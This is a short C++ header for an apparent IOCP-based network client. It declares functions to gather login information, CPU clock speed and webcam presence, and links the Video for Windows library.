#pragma once

#include "IOCPClient.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, int nType);
DWORD CPUClockMHz();
BOOL WebCamIsExist();
